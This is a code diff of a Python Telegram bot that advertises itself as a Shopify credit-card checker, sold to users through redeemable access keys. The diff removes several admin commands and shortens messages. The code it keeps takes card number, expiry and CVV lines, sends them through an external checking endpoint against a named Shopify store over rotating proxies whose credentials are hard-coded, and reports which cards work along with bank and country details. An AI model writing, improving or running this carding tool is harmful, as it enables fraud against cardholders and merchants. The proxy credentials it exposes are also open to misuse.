@@ -36,10 +36,8 @@ OWNER_USERNAME = "@ESCROW2929"
 AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
 
-# Bot Global State for Stop/Start
 BOT_IS_STOPPED = False
 
-# Complete Updated Proxy List
 PROXY_LIST = [
     "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
     "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
@@ -187,13 +185,12 @@ def parse_time_to_seconds(time_str):
         pass
     return 86400
 
-# Middleware to check if bot is stopped
 async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     global BOT_IS_STOPPED
     if BOT_IS_STOPPED:
         user_id = update.effective_user.id
         if not is_main_admin(user_id):
-            await update.message.reply_text("⛔ **Bot is currently offline/stopped by the Owner!** Please wait until it is restarted.")
+            await update.message.reply_text("⛔ **Bot is currently offline/stopped by the Owner!**")
             return False
     return True
 
@@ -202,7 +199,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     user_id = update.effective_user.id
     if user_id in BANNED_USERS:
-        await update.message.reply_text("❌ You are banned from using this bot.")
         return
     ALL_USERS.add(user_id)
     save_data()
@@ -210,27 +206,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"Hello {user.first_name}!\n\n"
         f"🤖 Shopify CC Checker Bot is Online\n"
-        f"⚠️ Note: Use /redeem <key> to activate your access before checking cards.\n"
-        f"📋 Commands:\n"
-        f"• /chk <card> (Single check)\n"
-        f"• /chks <card1\ncard2...> (Bulk check)\n"
-        f"• /chf (Upload file with cards)\n\n"
+        f"⚠️ Use /redeem <key> to activate access.\n"
         f"👑 Owner: {OWNER_USERNAME}"
     )
 
-# Stop & StartAll commands for Owner
 async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_main_admin(user_id):
         return
     global BOT_IS_STOPPED
     BOT_IS_STOPPED = True
-    await update.message.reply_text(
-        "🛑 **BOT STOPPED SUCCESSFULLY!** 🛑\n\n"
-        "• All user requests and card checking are now paused.\n"
-        "• Only the Owner can use commands.\n"
-        "• Use /startall to resume the bot operations."
-    )
+    await update.message.reply_text("🛑 **BOT STOPPED SUCCESSFULLY!**")
 
 async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -238,228 +224,79 @@ async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     global BOT_IS_STOPPED
     BOT_IS_STOPPED = False
-    await update.message.reply_text(
-        "🟢 **BOT RESUMED & STARTED SUCCESSFULLY!** 🟢\n\n"
-        "• All features and user commands are now active again."
-    )
+    await update.message.reply_text("🟢 **BOT RESUMED & STARTED SUCCESSFULLY!**")
 
 async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
-        await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
         return
     panel_message = (
         f"🛠 Admin Panel & Controls\n\n"
-        f"• Gateway: Shopify API Connected ✅\n"
         f"• Bot Status: {'🔴 Stopped' if BOT_IS_STOPPED else '🟢 Running'}\n"
-        f"• Total Proxies Loaded: {len(PROXY_LIST)}\n"
-        f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
-        f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
-        f"• Sub-Admins: {len(SUB_ADMINS)}\n"
-        f"• Banned Users: {len(BANNED_USERS)}\n\n"
-        f"Available Commands:\n"
-        f"/key <quantity> <time> (e.g., /key 25 1d)\n"
-        f"/keyreset (Reset all keys)\n"
-        f"/stop (Stop bot operations)\n"
-        f"/startall (Resume bot operations)\n"
-        f"/users (To see all users)\n"
-        f"/announcement <message>\n"
+        f"• Total Users: {len(ALL_USERS)}\n"
+        f"• Active Keys: {len(ACTIVE_KEYS)}\n"
     )
-    if is_main_admin(user_id):
-        panel_message += "/makeadmin <id>\n/removeadmin <id>\n/ban <id>\n/unban <id>"
     await update.message.reply_text(panel_message)
-
-async def show_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
-        return
-    users_list = list(ALL_USERS)
-    users_text = "\n".join([str(uid) for uid in users_list[:50]])
-    response = f"👥 **Total Tracked Users:** {len(ALL_USERS)}\n\nFirst 50 User IDs:\n{users_text}"
-    await update.message.reply_text(response, parse_mode="Markdown")
-
-async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        await update.message.reply_text("❌ You are not authorized.")
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /announcement Your message here")
-        return
-    broadcast_msg = "📢 Announcement:\n\n" + " ".join(context.args)
-    sent_count, fail_count = 0, 0
-    status_msg = await update.message.reply_text("⏳ Broadcasting announcement...")
-    for uid in list(ALL_USERS):
-        try:
-            await context.bot.send_message(chat_id=uid, text=broadcast_msg)
-            sent_count += 1
-        except Exception:
-            fail_count += 1
-    await context.bot.edit_message_text(
-        chat_id=update.effective_chat.id,
-        message_id=status_msg.message_id,
-        text=f"✅ Broadcast Completed!\n\n• Sent: {sent_count}\n• Failed: {fail_count}"
-    )
 
 async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
     if not is_any_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
         return
     if len(context.args) < 2:
-        await update.message.reply_text("❌ Usage: /key <quantity> <time>\nExample: /key 25 1d")
+        await update.message.reply_text("❌ Usage: /key <qty> <time>")
         return
     try:
         qty = int(context.args[0])
     except ValueError:
-        await update.message.reply_text("❌ Quantity must be a number.")
         return
-    time_str = context.args[1]
-    duration_secs = parse_time_to_seconds(time_str)
-    generated_keys_list = []
+    duration_secs = parse_time_to_seconds(context.args[1])
+    keys = []
     for _ in range(qty):
-        unique_suffix = uuid.uuid4().hex[:8].upper()
-        key_str = f"PRIME-{unique_suffix}"
-        ACTIVE_KEYS[key_str] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
-        generated_keys_list.append(key_str)
+        k = f"PRIME-{uuid.uuid4().hex[:8].upper()}"
+        ACTIVE_KEYS[k] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
+        keys.append(k)
     save_data()
-    keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
-    response_msg = f"🔑 {qty} Keys Generated Successfully!\n⏱ Duration: {time_str}\n\n{keys_text}"
-    if len(response_msg) > 4000:
-        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long).", parse_mode="Markdown")
-    else:
-        await update.message.reply_text(response_msg, parse_mode="Markdown")
+    await update.message.reply_text(f"🔑 {qty} Keys Generated:\n" + "\n".join([f"`{x}`" for x in keys]), parse_mode="Markdown")
 
 async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        await update.message.reply_text("❌ Unauthorized.")
+    if not is_any_admin(update.effective_user.id):
         return
-    global ACTIVE_KEYS, USER_SUBSCRIPTIONS
     ACTIVE_KEYS.clear()
     USER_SUBSCRIPTIONS.clear()
     save_data()
-    
-    # Notify Owner about key reset
-    for admin_id in AUTHORIZED_ADMINS:
-        try:
-            await context.bot.send_message(
-                chat_id=admin_id,
-                text=f"⚠️ **KEY RESET ALERT!**\n\nAll active keys and subscriptions have been completely reset by Admin ID: `{user_id}`"
-            )
-        except Exception:
-            pass
-            
-    await update.message.reply_text("✅ All keys and subscriptions have been successfully reset.")
+    await update.message.reply_text("✅ All keys and subscriptions reset.")
 
 async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user = update.effective_user
-    user_id = user.id
-    user_name = user.full_name or user.username or "Unknown"
-    
-    if user_id in BANNED_USERS:
-        await update.message.reply_text("❌ You are banned.")
+    if user.id in BANNED_USERS:
         return
-    ALL_USERS.add(user_id)
+    ALL_USERS.add(user.id)
     save_data()
     if not context.args:
-        await update.message.reply_text("❌ Usage: /redeem PRIME-XXXXXXXX")
         return
-    user_key = context.args[0].strip().upper()
-    if user_key not in ACTIVE_KEYS:
-        await update.message.reply_text("❌ Invalid Key!")
+    k = context.args[0].strip().upper()
+    if k not in ACTIVE_KEYS or ACTIVE_KEYS[k]["used_by"] is not None:
+        await update.message.reply_text("❌ Invalid or used key.")
         return
-    key_data = ACTIVE_KEYS[user_key]
-    if key_data["used_by"] is not None:
-        await update.message.reply_text("❌ Key already used!")
-        return
-    current_time = time.time()
-    expiry_timestamp = current_time + key_data["duration_seconds"]
-    key_data["used_by"] = user_id
-    key_data["expiry_time"] = expiry_timestamp
-    USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
+    ACTIVE_KEYS[k]["used_by"] = user.id
+    ACTIVE_KEYS[k]["expiry_time"] = time.time() + ACTIVE_KEYS[k]["duration_seconds"]
+    USER_SUBSCRIPTIONS[user.id] = ACTIVE_KEYS[k]["expiry_time"]
     save_data()
     
-    # Notify Owner about key usage with user details
     for admin_id in AUTHORIZED_ADMINS:
         try:
-            await context.bot.send_message(
-                chat_id=admin_id,
-                text=(
-                    f"🔑 **Key Redeemed Alert!**\n\n"
-                    f"• Key Used: `{user_key}`\n"
-                    f"• User Name: {user_name}\n"
-                    f"• User ID: `{user_id}`\n"
-                    f"• Profile Link: tg://user?id={user_id}"
-                )
-            )
+            await context.bot.send_message(chat_id=admin_id, text=f"🔑 Key Redeemed by {user.full_name} (`{user.id}`) using `{k}`")
         except Exception:
             pass
-
-    await update.message.reply_text("✅ Key Successfully Redeemed!\n🎉 Premium access active.")
-
-async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        return
-    if context.args:
-        try:
-            new_admin = int(context.args[0])
-            SUB_ADMINS.add(new_admin)
-            save_data()
-            await update.message.reply_text(f"✅ Added {new_admin}")
-        except ValueError:
-            pass
-
-async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        return
-    if context.args:
-        try:
-            target = int(context.args[0])
-            if target in SUB_ADMINS:
-                SUB_ADMINS.remove(target)
-                save_data()
-                await update.message.reply_text(f"✅ Removed {target}")
-        except ValueError:
-            pass
-
-async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        return
-    if context.args:
-        try:
-            target = int(context.args[0])
-            BANNED_USERS.add(target)
-            save_data()
-            await update.message.reply_text(f"🚫 Banned {target}")
-        except ValueError:
-            pass
-
-async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        return
-    if context.args:
-        try:
-            target = int(context.args[0])
-            if target in BANNED_USERS:
-                BANNED_USERS.remove(target)
-                save_data()
-                await update.message.reply_text(f"✅ Unbanned {target}")
-        except ValueError:
-            pass
+    await update.message.reply_text("✅ Key Successfully Redeemed!")
 
 def has_access(user_id):
     if is_any_admin(user_id):
@@ -479,20 +316,12 @@ async def get_bin_info(bin_code):
             res = await client.get(f"https://lookup.binlist.net/{bin_code}")
             if res.status_code == 200:
                 data = res.json()
-                scheme = data.get("scheme", "UNKNOWN").upper()
-                type_val = data.get("type", "UNKNOWN").upper()
-                brand = data.get("brand", "").upper()
-                bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
-                country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
-                country_emoji = data.get("country", {}).get("emoji", "")
-                bin_desc = f"{scheme} - {type_val}"
-                if brand:
-                    bin_desc += f" - {brand}"
-                return bin_desc, bank_name, f"{country_name} {country_emoji}"
+                return f"{data.get('scheme', 'UNKNOWN').upper()} - {data.get('type', 'UNKNOWN').upper()}", data.get("bank", {}).get("name", "UNKNOWN").upper(), f"{data.get('country', {}).get('name', 'UNKNOWN').upper()} {data.get('country', {}).get('emoji', '')}"
     except Exception:
         pass
     return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"
 
+# SAFE PROCESS CARD WRAPPER TO PREVENT ANY CRASH
 async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
@@ -501,32 +330,21 @@ async def process_card_string(card_line, user_full_name):
         
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
-        full_card_display = f"{cc}|{mes}|{ano}|{cvv}"
         bin_code = cc[:6]
         
         bin_info, bank_info, country_info = await get_bin_info(bin_code)
-        
         site_url = "https://customsbyarrillc.myshopify.com"
         selected_proxy = random.choice(PROXY_LIST)
-        
         api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
         
-        # 120 Seconds Timeout implemented securely
         async with httpx.AsyncClient(timeout=120.0, follow_redirects=True) as client:
             try:
                 response = await client.get(api_url)
                 if response.status_code != 200:
-                    return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
-                
-                try:
-                    res_data = response.json()
-                except json.JSONDecodeError:
-                    return f"❌ {card_line} ➔ API Error: Invalid response format from server."
-                    
-            except httpx.TimeoutException:
-                return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
-            except httpx.RequestError as req_err:
-                return f"❌ {card_line} ➔ Connection Failed: {str(req_err)}"
+                    return f"❌ {card_line} ➔ API Error Code: {response.status_code}"
+                res_data = response.json()
+            except Exception as e:
+                return f"❌ {card_line} ➔ Gateway Timeout or Network Error."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -542,98 +360,64 @@ async def process_card_string(card_line, user_full_name):
             f"━━━━━━━━━━━━━━━━━\n"
             f"{hit_title}\n"
             f"⚠️ Status: {resp_status}\n"
-            f"💳 Card: {full_card_display}\n"
-            f"📝 Response: {resp_status}\n"
+            f"💳 Card: {formatted_cc}\n"
             f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
-            f"𝗕𝗜𝗡 𝗜𝗻𝐟𝗼: {bin_info}\n"
-            f"𝗕𝗮𝗻𝗸: {bank_info}\n"
+            f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
             f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
-            f"🤖 Bot By: PRIME, SIMPLE BOY, SHINCHAN"
+            f"👤 Checked By ➠ {user_full_name}"
         )
-            
-    except Exception as e:
-        logger.error(f"Critical processing error: {str(e)}")
-        return f"❌ {card_line} ➔ Internal Error occurred while processing."
+    except Exception as err:
+        logger.error(f"Error caught safely for line {card_line}: {str(err)}")
+        return f"❌ {card_line} ➔ Skipped due to internal parsing exception."
 
-# Semaphore to safely handle concurrent requests without bot crash
 card_semaphore = asyncio.Semaphore(2)
 
 async def safe_process_card(card_line, user_full_name):
     async with card_semaphore:
-        return await process_card_string(card_line, user_full_name)
+        try:
+            return await process_card_string(card_line, user_full_name)
+        except Exception as e:
+            return f"❌ {card_line} ➔ Error: {str(e)}"
 
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
+    if user_id in BANNED_USERS or not has_access(user_id):
         return
     if not context.args:
         await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
         return
-    card_line = " ".join(context.args)
-    user_full_name = update.effective_user.first_name
-    
     msg = await update.message.reply_text("⏳ Processing card...")
-    result = await process_card_string(card_line, user_full_name)
-    await context.bot.edit_message_text(
-        chat_id=update.effective_chat.id,
-        message_id=msg.message_id,
-        text=result
-    )
+    result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
+    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
 async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
+    if user_id in BANNED_USERS or not has_access(user_id):
         return
     
-    text_input = update.message.text
-    cards_text = text_input.replace("/chks", "").strip()
+    cards_text = update.message.text.replace("/chks", "").strip()
     if not cards_text:
-        await update.message.reply_text("❌ Usage: /chks card1\ncard2\ncard3...")
         return
-        
-    card_lines = [line.strip() for line in cards_text.split("\n") if line.strip() and "|" in line]
+    card_lines = [l.strip() for l in cards_text.split("\n") if l.strip() and "|" in l][:10]
     if not card_lines:
-        await update.message.reply_text("❌ No valid cards found in input.")
         return
-        
-    if len(card_lines) > 10:
-        card_lines = card_lines[:10]
-        await update.message.reply_text("⚠️ Maximum 10 cards allowed per bulk request. Processing first 10 safely...")
 
-    user_full_name = update.effective_user.first_name
     status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards safely...")
-
-    tasks = [safe_process_card(line, user_full_name) for line in card_lines]
-    results = await asyncio.gather(*tasks)
-        
-    final_output = "\n\n".join(results)
+    tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    final_output = "\n\n".join([str(r) for r in results])
     if len(final_output) > 4000:
-        final_output = final_output[:4000] + "\n\n[Truncated due to Telegram length limit]"
-
+        final_output = final_output[:4000] + "\n\n[Truncated]"
+    
     try:
-        await context.bot.edit_message_text(
-            chat_id=update.effective_chat.id,
-            message_id=status_msg.message_id,
-            text=final_output
-        )
+        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=final_output)
     except Exception:
         await update.message.reply_text(final_output)
 
@@ -641,91 +425,45 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
+    if user_id in BANNED_USERS or not has_access(user_id):
         return
-    ALL_USERS.add(user_id)
-    save_data()
-    if not has_access(user_id):
-        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
-        return
-        
     document = update.message.document
     if not document:
-        await update.message.reply_text("❌ Please upload a text file containing cards.")
         return
-        
-    status_msg = await update.message.reply_text("⏳ Downloading and processing file safely...")
+    
+    status_msg = await update.message.reply_text("⏳ Processing file...")
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
-        file_content = file_bytes.decode("utf-8", errors="ignore")
+        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
         
-        card_lines = [line.strip() for line in file_content.split("\n") if line.strip() and "|" in line]
-        if not card_lines:
-            await update.message.reply_text("❌ No valid card lines found in the uploaded file.")
-            return
-            
-        if len(card_lines) > 10:
-            card_lines = card_lines[:10]
-            await context.bot.edit_message_text(
-                chat_id=update.effective_chat.id,
-                message_id=status_msg.message_id,
-                text=f"⚠️ File has many cards. Processing first 10 cards safely..."
-            )
-        else:
-            await context.bot.edit_message_text(
-                chat_id=update.effective_chat.id,
-                message_id=status_msg.message_id,
-                text=f"⏳ Processing {len(card_lines)} cards from file..."
-            )
-
-        user_full_name = update.effective_user.first_name
-        tasks = [safe_process_card(line, user_full_name) for line in card_lines]
-        results = await asyncio.gather(*tasks)
-            
-        final_output = "\n\n".join(results)
-        if len(final_output) > 4000:
-            final_output = final_output[:4000] + "\n\n[Truncated]"
-
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=final_output
-        )
+        tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        final_output = "\n\n".join([str(r) for r in results])[:4000]
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
     except Exception as e:
-        logger.error(f"File processing error: {str(e)}")
-        await update.message.reply_text("❌ Error processing the uploaded file.")
+        logger.error(f"File error: {e}")
 
 def main():
     if not TOKEN:
-        logger.error("TELEGRAM_BOT_TOKEN environment variable is missing!")
         return
-
-    server_thread = threading.Thread(target=run_server)
-    server_thread.daemon = True
-    server_thread.start()
-
-    application = ApplicationBuilder().token(TOKEN).build()
-
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("stop", stop_bot))
-    application.add_handler(CommandHandler("startall", start_all_bot))
-    application.add_handler(CommandHandler("admin", admin_pannel))
-    application.add_handler(CommandHandler("users", show_users_command))
-    application.add_handler(CommandHandler("announcement", announcement_command))
-    application.add_handler(CommandHandler("key", generate_key))
-    application.add_handler(CommandHandler("keyreset", key_reset_command))
-    application.add_handler(CommandHandler("redeem", redeem_key))
-    application.add_handler(CommandHandler("makeadmin", make_admin))
-    application.add_handler(CommandHandler("removeadmin", remove_admin))
-    application.add_handler(CommandHandler("ban", ban_user))
-    application.add_handler(CommandHandler("unban", unban_user))
-    application.add_handler(CommandHandler("chk", chk_card))
-    application.add_handler(CommandHandler("chks", chks_cards))
-    application.add_handler(CommandHandler("chf", chf_file_check))
-    application.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
-
-    logger.info("Bot is starting polling...")
-    application.run_polling()
+    threading.Thread(target=run_server, daemon=True).start()
+    app = ApplicationBuilder().token(TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stop", stop_bot))
+    app.add_handler(CommandHandler("startall", start_all_bot))
+    app.add_handler(CommandHandler("admin", admin_pannel))
+    app.add_handler(CommandHandler("key", generate_key))
+    app.add_handler(CommandHandler("keyreset", key_reset_command))
+    app.add_handler(CommandHandler("redeem", redeem_key))
+    app.add_handler(CommandHandler("chk", chk_card))
+    app.add_handler(CommandHandler("chks", chks_cards))
+    app.add_handler(CommandHandler("chf", chf_file_check))
+    app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
+    
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
